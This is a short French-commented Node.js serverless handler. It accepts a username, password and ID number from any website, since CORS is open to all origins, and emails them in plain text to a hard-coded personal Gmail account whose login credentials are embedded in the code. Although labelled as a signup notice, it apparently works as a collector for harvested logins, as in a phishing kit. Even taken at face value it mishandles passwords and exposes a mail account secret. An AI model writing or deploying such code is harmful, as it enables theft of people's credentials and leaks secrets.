import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === 'OPTIONS') return res.status(200).end();

  if (req.method === 'POST') {
    const { username, password, matricule } = req.body;

    if (!username || !password || !matricule) {
      return res.status(400).json({ message: 'Tous les champs sont requis.' });
    }

    // Configurer Nodemailer avec Gmail (ou autre SMTP)
    let transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: "buyanafidele91@gmail.com",  // ton email
        pass: "fidele buyana"   // mot de passe ou token app
      }
    });

    // Contenu du mail
    let mailOptions = {
      from: process.env.EMAIL_USER,
      to: 'buyanafidele91@gmail.com',
      subject: 'Nouvelle inscription',
      text: `Nouvel utilisateur inscrit:\nUsername: ${username}\nMatricule: ${matricule}\nMot de passe: ${password}`
    };

    try {
      await transporter.sendMail(mailOptions);
      return res.status(200).json({ message: 'Inscription envoyée par email !' });
    } catch (error) {
      console.error(error);
      return res.status(500).json({ message: 'Erreur lors de l’envoi du mail.' });
    }
  }

  res.status(405).json({ message: 'Méthode non autorisée.' });
}
